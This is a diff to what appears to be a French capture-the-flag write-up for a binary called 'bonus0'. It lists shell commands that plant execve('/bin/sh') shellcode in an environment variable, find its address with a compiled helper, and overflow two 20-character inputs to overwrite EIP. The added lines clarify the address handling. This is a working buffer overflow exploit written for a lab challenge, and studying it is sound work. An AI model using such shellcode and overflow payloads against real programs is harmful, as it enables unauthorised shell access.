@@ -34,5 +34,5 @@
 	- Envoyer deux inputs de 20 chars, le second écrasant l’EIP avec l’adresse du shellcode.
 - Commandes utilisées :
 	- `export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')`
-	- `echo 'int main() { printf("0x%x\n", getenv("SHELLCODE")); }' > /tmp/find.c && gcc /tmp/find.c -o /tmp/find && /tmp/find`
-	- `(python -c 'print "A"*20'; python -c 'print "B"*9 + "\x42\xff\xff\xbf" + "C"*7'; cat) | ./bonus0`
+	- `echo 'int main() { printf("0x%x\n", getenv("SHELLCODE")); }' > /tmp/find.c && gcc /tmp/find.c -o /tmp/find && /tmp/find` (l'adresse retournée est propre à l'environnement courant ; elle change si on ajoute ou retire des variables d'environnement)
+	- `(python -c 'print "A"*20'; python -c 'print "B"*9 + "\x42\xff\xff\xbf" + "C"*7'; cat) | ./bonus0` (remplacer `\x42\xff\xff\xbf` par l'adresse obtenue ci-dessus, en little-endian)
